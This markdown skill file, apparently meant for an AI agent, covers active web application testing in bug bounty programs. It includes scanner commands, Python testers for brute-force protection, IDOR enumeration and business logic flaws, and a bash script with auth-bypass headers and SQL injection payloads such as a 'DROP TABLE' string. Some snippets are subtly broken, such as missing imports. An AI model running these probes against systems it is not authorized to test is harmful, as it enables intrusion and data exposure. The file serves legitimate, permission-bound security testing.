---
description: "Active security testing of web applications within bounty program scope"
tags: [security, web-testing, penetration-testing, active-testing]
created: 2026-03-15
---

# Active Web Application Testing

## When to Use

Use this skill for active security testing when:
- Bounty program explicitly permits testing against live applications
- You have written permission to test specific URLs/endpoints
- Testing against dedicated security testing environments (staging, sandboxes)
- Conducting ethical penetration testing within defined scope
- Verifying vulnerabilities found through static analysis

## Prerequisites

**MANDATORY CHECKS:**
1. ✅ Confirmed explicit permission for active testing
2. ✅ Target is within bounty program scope
3. ✅ No "read-only" or "source code analysis only" restrictions
4. ✅ Rate limiting and testing guidelines understood and respected
5. ✅ Emergency contact information available in case of issues

**NEVER proceed without explicit written permission to test live systems.**

## Testing Methodology

### Phase 1: Target Reconnaissance

```bash
# Passive information gathering first
nmap -sn target.com  # Basic host discovery
nslookup target.com  # DNS information
whois target.com     # Domain information

# Technology fingerprinting
whatweb target.com   # Web technology detection
curl -I https://target.com  # Response headers analysis

# Directory/endpoint discovery (passive)
dirb https://target.com /usr/share/dirb/wordlists/common.txt -w

# Subdomain enumeration (passive)
sublist3r -d target.com -o subdomains.txt
```

### Phase 2: Automated Vulnerability Scanning

```bash
# Set up scanning environment
mkdir -p /workspace/active-testing/$(date +%Y%m%d-%H%M%S)
cd /workspace/active-testing/$(date +%Y%m%d-%H%M%S)

# Nikto web vulnerability scanner
nikto -h https://target.com -output nikto-results.txt

# OWASP ZAP automated scan
zap-baseline.py -t https://target.com -r zap-baseline-report.html

# SQLMap for database testing (if forms/parameters detected)
sqlmap -u "https://target.com/search?q=test" --batch --level=1 --risk=1

# Directory brute force (with rate limiting)
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -t 10 -q

# SSL/TLS testing
sslscan target.com
testssl target.com
```

### Phase 3: Manual Testing Framework

**Authentication Testing:**

```python
#!/usr/bin/env python3
"""
Comprehensive authentication testing framework
"""

import requests
import time
import json
from urllib.parse import urljoin

class AuthenticationTester:
    def __init__(self, target_url, rate_limit_delay=1):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.rate_limit_delay = rate_limit_delay
        
    def test_password_policies(self, register_endpoint="/register"):
        """Test password policy enforcement"""
        weak_passwords = [
            "123456", "password", "admin", "test", "qwerty",
            "12345", "password123", "admin123", "root", "guest"
        ]
        
        results = []
        for password in weak_passwords:
            time.sleep(self.rate_limit_delay)
            
            data = {
                "username": f"testuser{int(time.time())}",
                "password": password,
                "email": f"test{int(time.time())}@example.com"
            }
            
            response = self.session.post(
                urljoin(self.target_url, register_endpoint), 
                data=data
            )
            
            if response.status_code == 200 and "success" in response.text.lower():
                results.append(f"Weak password accepted: {password}")
                
        return results
        
    def test_brute_force_protection(self, login_endpoint="/login", username="admin"):
        """Test for brute force protection mechanisms"""
        failed_attempts = 0
        
        for attempt in range(10):  # Limited attempts for ethical testing
            time.sleep(self.rate_limit_delay)
            
            data = {
                "username": username,
                "password": f"wrongpassword{attempt}"
            }
            
            response = self.session.post(
                urljoin(self.target_url, login_endpoint), 
                data=data
            )
            
            if "locked" in response.text.lower() or "rate limited" in response.text.lower():
                return f"Brute force protection activated after {attempt + 1} attempts"
                
            if response.status_code == 429:  # Too Many Requests
                return f"Rate limiting detected after {attempt + 1} attempts"
                
            failed_attempts += 1
            
        return f"No brute force protection detected after {failed_attempts} failed attempts"
        
    def test_session_management(self, login_endpoint="/login", valid_creds=None):
        """Test session management security"""
        if not valid_creds:
            return "No valid credentials provided for session testing"
            
        # Login with valid credentials
        login_response = self.session.post(
            urljoin(self.target_url, login_endpoint),
            data=valid_creds
        )
        
        if "success" not in login_response.text.lower():
            return "Could not establish authenticated session"
            
        results = []
        
        # Test session fixation
        old_session = self.session.cookies.get('sessionid') or self.session.cookies.get('PHPSESSID')
        
        # Make authenticated request
        profile_response = self.session.get(urljoin(self.target_url, "/profile"))
        new_session = self.session.cookies.get('sessionid') or self.session.cookies.get('PHPSESSID')
        
        if old_session and old_session == new_session:
            results.append("Potential session fixation vulnerability")
            
        # Test logout functionality
        logout_response = self.session.post(urljoin(self.target_url, "/logout"))
        post_logout_response = self.session.get(urljoin(self.target_url, "/profile"))
        
        if post_logout_response.status_code == 200 and "profile" in post_logout_response.text.lower():
            results.append("Session not properly invalidated on logout")
            
        return results

# Save authentication testing framework
auth_tester_code = '''[Above code block]'''
with open('/workspace/active-testing/auth_tester.py', 'w') as f:
    f.write(auth_tester_code)
```

**IDOR (Insecure Direct Object Reference) Testing:**

```python
#!/usr/bin/env python3
"""
Active IDOR vulnerability testing
"""

import requests
import json
import itertools

class IDORTester:
    def __init__(self, target_url, auth_token=None):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        if auth_token:
            self.session.headers.update({'Authorization': f'Bearer {auth_token}'})
            
    def test_numeric_idor(self, endpoint_pattern, id_range=range(1, 100)):
        """Test for numeric IDOR vulnerabilities"""
        accessible_resources = []
        
        for resource_id in id_range:
            time.sleep(0.5)  # Rate limiting
            
            url = endpoint_pattern.format(id=resource_id)
            response = self.session.get(urljoin(self.target_url, url))
            
            if response.status_code == 200:
                # Check if response contains meaningful data
                if len(response.text) > 100 and "not found" not in response.text.lower():
                    accessible_resources.append({
                        'id': resource_id,
                        'url': url,
                        'content_length': len(response.text),
                        'sample_content': response.text[:200]
                    })
                    
        return accessible_resources
        
    def test_uuid_idor(self, endpoint_pattern, known_uuids=None):
        """Test for UUID-based IDOR vulnerabilities"""
        if not known_uuids:
            # Generate some test UUIDs (this would normally come from recon)
            import uuid
            known_uuids = [str(uuid.uuid4()) for _ in range(10)]
            
        results = []
        for test_uuid in known_uuids:
            time.sleep(0.5)
            
            url = endpoint_pattern.format(uuid=test_uuid)
            response = self.session.get(urljoin(self.target_url, url))
            
            if response.status_code == 200:
                results.append({
                    'uuid': test_uuid,
                    'url': url,
                    'accessible': True
                })
                
        return results
        
    def test_parameter_pollution(self, endpoint, base_id):
        """Test for HTTP Parameter Pollution in IDOR contexts"""
        test_cases = [
            f"?id={base_id}&id=999",  # Duplicate parameters
            f"?id[]={base_id}&id[]=999",  # Array parameters
            f"?id={base_id}%26id=999",  # URL encoding
        ]
        
        results = []
        for test_case in test_cases:
            url = urljoin(self.target_url, endpoint + test_case)
            response = self.session.get(url)
            
            if response.status_code == 200:
                results.append({
                    'test_case': test_case,
                    'response_length': len(response.text),
                    'potential_issue': len(response.text) > 100
                })
                
        return results

# Example usage
def run_idor_tests():
    tester = IDORTester("https://target.com")
    
    # Test common IDOR patterns
    patterns_to_test = [
        "/api/users/{id}",
        "/profile/{id}",
        "/documents/{id}",
        "/orders/{id}",
        "/files/{id}"
    ]
    
    for pattern in patterns_to_test:
        print(f"Testing IDOR in: {pattern}")
        results = tester.test_numeric_idor(pattern)
        
        if results:
            print(f"  Found {len(results)} accessible resources")
            for result in results[:3]:  # Show first 3 examples
                print(f"    ID {result['id']}: {result['content_length']} bytes")
        else:
            print("  No IDOR vulnerabilities detected")
```

### Phase 4: Business Logic Testing

```python
#!/usr/bin/env python3
"""
Business logic vulnerability testing
"""

class BusinessLogicTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
    def test_price_manipulation(self, cart_endpoint, product_id):
        """Test for price manipulation vulnerabilities"""
        # Add item to cart
        add_response = self.session.post(
            urljoin(self.target_url, cart_endpoint),
            data={'product_id': product_id, 'quantity': 1}
        )
        
        # Try to manipulate price
        manipulation_attempts = [
            {'product_id': product_id, 'quantity': 1, 'price': 0.01},
            {'product_id': product_id, 'quantity': -1},  # Negative quantity
            {'product_id': product_id, 'quantity': 999999},  # Large quantity
        ]
        
        results = []
        for attempt in manipulation_attempts:
            response = self.session.post(urljoin(self.target_url, cart_endpoint), data=attempt)
            
            if response.status_code == 200 and "success" in response.text.lower():
                results.append(f"Potential price manipulation: {attempt}")
                
        return results
        
    def test_race_conditions(self, endpoint, data, concurrent_requests=5):
        """Test for race condition vulnerabilities"""
        import threading
        import time
        
        results = []
        threads = []
        
        def make_request():
            response = self.session.post(urljoin(self.target_url, endpoint), data=data)
            results.append({
                'status_code': response.status_code,
                'response_text': response.text[:200],
                'timestamp': time.time()
            })
        
        # Launch concurrent requests
        for _ in range(concurrent_requests):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()
            
        # Wait for completion
        for thread in threads:
            thread.join()
            
        # Analyze results for race conditions
        success_count = sum(1 for r in results if r['status_code'] == 200)
        if success_count > 1:
            return f"Potential race condition: {success_count} concurrent successes"
            
        return "No race condition detected"
        
    def test_workflow_bypasses(self, workflow_steps):
        """Test for workflow/state manipulation"""
        # workflow_steps should be a list of (method, endpoint, data) tuples
        
        # Test normal workflow
        print("Testing normal workflow...")
        for i, (method, endpoint, data) in enumerate(workflow_steps):
            if method.upper() == 'POST':
                response = self.session.post(urljoin(self.target_url, endpoint), data=data)
            else:
                response = self.session.get(urljoin(self.target_url, endpoint))
                
            print(f"  Step {i+1}: {response.status_code}")
            
        # Test workflow bypass (skip steps)
        print("Testing workflow bypass...")
        try:
            # Try accessing final step directly
            final_method, final_endpoint, final_data = workflow_steps[-1]
            if final_method.upper() == 'POST':
                bypass_response = self.session.post(
                    urljoin(self.target_url, final_endpoint), 
                    data=final_data
                )
            else:
                bypass_response = self.session.get(urljoin(self.target_url, final_endpoint))
                
            if bypass_response.status_code == 200:
                return "Workflow bypass possible - final step accessible without prerequisites"
                
        except Exception as e:
            return f"Error testing workflow bypass: {e}"
            
        return "Workflow bypass not detected"
```

### Phase 5: API Security Testing

```bash
#!/bin/bash
# API security testing framework

API_BASE_URL="$1"
API_KEY="$2"  # If required

if [[ -z "$API_BASE_URL" ]]; then
    echo "Usage: $0 <api_base_url> [api_key]"
    exit 1
fi

# Test for API enumeration
echo "=== API Endpoint Enumeration ==="
common_endpoints=(
    "/api/v1/users"
    "/api/v1/admin"
    "/api/v1/config"
    "/api/users"
    "/api/admin"
    "/api/health"
    "/api/status"
    "/api/debug"
    "/api/test"
)

for endpoint in "${common_endpoints[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$API_BASE_URL$endpoint")
    if [[ "$response" != "404" ]] && [[ "$response" != "403" ]]; then
        echo "  Found endpoint: $endpoint (HTTP $response)"
    fi
done

# Test for API versioning issues
echo "=== API Version Testing ==="
api_versions=("v1" "v2" "v3" "v1.0" "v1.1" "v2.0" "beta" "test" "dev")
for version in "${api_versions[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$API_BASE_URL/api/$version/users")
    if [[ "$response" == "200" ]]; then
        echo "  Accessible API version: $version"
    fi
done

# Test for authentication bypasses
echo "=== Authentication Bypass Testing ==="
auth_bypass_headers=(
    "X-Original-URL: /api/admin"
    "X-Rewrite-URL: /api/admin" 
    "X-Forwarded-For: 127.0.0.1"
    "Client-IP: 127.0.0.1"
    "X-Remote-IP: 127.0.0.1"
    "X-Originating-IP: 127.0.0.1"
    "X-Forwarded-Host: localhost"
    "X-Remote-Addr: 127.0.0.1"
)

for header in "${auth_bypass_headers[@]}"; do
    response=$(curl -s -H "$header" -o /dev/null -w "%{http_code}" "$API_BASE_URL/api/admin")
    if [[ "$response" == "200" ]]; then
        echo "  Potential auth bypass with header: $header"
    fi
done

# Test for mass assignment vulnerabilities
echo "=== Mass Assignment Testing ==="
test_data='{"username":"test","email":"test@test.com","role":"admin","is_admin":true,"permissions":["all"]}'
response=$(curl -s -X POST -H "Content-Type: application/json" -d "$test_data" "$API_BASE_URL/api/users")
echo "  Mass assignment test response: $response"

# Test for injection in JSON parameters
echo "=== JSON Injection Testing ==="
injection_payloads=(
    '{"username":"admin","password":"password OR 1=1--"}'
    '{"search":"test\"; DROP TABLE users;--"}'
    '{"id":"1 OR 1=1"}'
)

for payload in "${injection_payloads[@]}"; do
    response=$(curl -s -X POST -H "Content-Type: application/json" -d "$payload" "$API_BASE_URL/api/search")
    if [[ "$response" == *"error"* ]] || [[ "$response" == *"mysql"* ]] || [[ "$response" == *"sql"* ]]; then
        echo "  Potential injection vulnerability with payload: $payload"
    fi
done
```

### Phase 6: Results Analysis and Documentation

```python
#!/usr/bin/env python3
"""
Active testing results analyzer and report generator
"""

import json
import os
from datetime import datetime
import subprocess

class TestingResultsAnalyzer:
    def __init__(self, results_dir):
        self.results_dir = results_dir
        self.findings = []
        
    def analyze_nikto_results(self, nikto_file):
        """Analyze Nikto scan results"""
        if not os.path.exists(nikto_file):
            return
            
        with open(nikto_file, 'r') as f:
            content = f.read()
            
        # Parse Nikto findings
        if "OSVDB" in content or "CVE" in content:
            self.findings.append({
                'type': 'Web Server Vulnerability',
                'source': 'Nikto',
                'severity': 'Medium',
                'details': 'Known vulnerabilities detected in web server'
            })
            
    def analyze_zap_results(self, zap_file):
        """Analyze OWASP ZAP results"""
        if not os.path.exists(zap_file):
            return
            
        # ZAP HTML report parsing would go here
        # For now, check file size as indicator
        if os.path.getsize(zap_file) > 10000:  # Large report indicates findings
            self.findings.append({
                'type': 'Web Application Vulnerability',
                'source': 'OWASP ZAP',
                'severity': 'Various',
                'details': 'Multiple vulnerabilities detected by automated scanner'
            })
    
    def analyze_manual_test_results(self, manual_results):
        """Analyze manual testing results"""
        for result in manual_results:
            if result.get('vulnerable', False):
                self.findings.append({
                    'type': result['vulnerability_type'],
                    'source': 'Manual Testing',
                    'severity': result.get('severity', 'Medium'),
                    'details': result['details'],
                    'proof_of_concept': result.get('poc', '')
                })
                
    def generate_summary_report(self):
        """Generate comprehensive testing summary"""
        report = {
            'scan_date': datetime.now().isoformat(),
            'total_findings': len(self.findings),
            'severity_breakdown': {},
            'vulnerability_types': {},
            'findings': self.findings
        }
        
        # Count severity levels
        for finding in self.findings:
            severity = finding.get('severity', 'Unknown')
            report['severity_breakdown'][severity] = report['severity_breakdown'].get(severity, 0) + 1
            
            vuln_type = finding['type']
            report['vulnerability_types'][vuln_type] = report['vulnerability_types'].get(vuln_type, 0) + 1
            
        # Save report
        with open(f"{self.results_dir}/testing_summary.json", 'w') as f:
            json.dump(report, f, indent=2)
            
        # Generate markdown report
        self.generate_markdown_report(report)
        
        return report
        
    def generate_markdown_report(self, report):
        """Generate markdown report for bug bounty submission"""
        markdown_template = f"""# Active Security Testing Report

## Executive Summary
- **Scan Date**: {report['scan_date']}
- **Total Findings**: {report['total_findings']}
- **High Severity**: {report['severity_breakdown'].get('High', 0)}
- **Medium Severity**: {report['severity_breakdown'].get('Medium', 0)}
- **Low Severity**: {report['severity_breakdown'].get('Low', 0)}

## Vulnerability Breakdown
"""
        
        for vuln_type, count in report['vulnerability_types'].items():
            markdown_template += f"- **{vuln_type}**: {count} finding(s)\n"
            
        markdown_template += "\n## Detailed Findings\n\n"
        
        for i, finding in enumerate(report['findings'], 1):
            markdown_template += f"""### Finding {i}: {finding['type']}
- **Severity**: {finding['severity']}
- **Source**: {finding['source']}
- **Details**: {finding['details']}

"""
            if finding.get('proof_of_concept'):
                markdown_template += f"**Proof of Concept**:\n```\n{finding['proof_of_concept']}\n```\n\n"
                
        with open(f"{self.results_dir}/testing_report.md", 'w') as f:
            f.write(markdown_template)

# Example usage
def run_comprehensive_testing(target_url):
    results_dir = f"/workspace/active-testing/{datetime.now().strftime('%Y%m%d-%H%M%S')}"
    os.makedirs(results_dir, exist_ok=True)
    
    print(f"Starting comprehensive testing of {target_url}")
    
    # Run automated scans
    subprocess.run(f"nikto -h {target_url} -output {results_dir}/nikto.txt", shell=True)
    subprocess.run(f"zap-baseline.py -t {target_url} -r {results_dir}/zap.html", shell=True)
    
    # Run manual tests
    auth_tester = AuthenticationTester(target_url)
    idor_tester = IDORTester(target_url)
    logic_tester = BusinessLogicTester(target_url)
    
    manual_results = []
    
    # Example manual testing
    weak_passwords = auth_tester.test_password_policies()
    if weak_passwords:
        manual_results.append({
            'vulnerability_type': 'Weak Password Policy',
            'vulnerable': True,
            'severity': 'Medium',
            'details': f"Weak passwords accepted: {', '.join(weak_passwords)}"
        })
    
    # Analyze all results
    analyzer = TestingResultsAnalyzer(results_dir)
    analyzer.analyze_nikto_results(f"{results_dir}/nikto.txt")
    analyzer.analyze_zap_results(f"{results_dir}/zap.html")
    analyzer.analyze_manual_test_results(manual_results)
    
    # Generate comprehensive report
    summary = analyzer.generate_summary_report()
    print(f"Testing complete. {summary['total_findings']} findings identified.")
    print(f"Report saved to: {results_dir}/testing_report.md")
    
    return summary

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 active_testing_framework.py <target_url>")
        sys.exit(1)
        
    target = sys.argv[1]
    run_comprehensive_testing(target)
```

## Ethical Testing Guidelines

1. **Always get explicit permission** before conducting active tests
2. **Respect rate limits** - don't overwhelm target systems
3. **Use minimal impact techniques** - verify vulnerabilities without causing damage
4. **Document everything** - maintain detailed logs of all testing activities
5. **Clean up artifacts** - remove any test data or accounts created during testing
6. **Report responsibly** - notify the organization immediately of critical findings
7. **Stay within scope** - never test systems outside the bounty program scope

## Emergency Procedures

If testing causes unexpected issues:

1. **Stop all testing immediately**
2. **Document what was happening when the issue occurred**
3. **Contact the bounty program emergency contact (if available)**
4. **Preserve logs for analysis**
5. **Prepare a detailed incident report**

This skill enables comprehensive active security testing while maintaining ethical boundaries and professional standards required for bug bounty programs.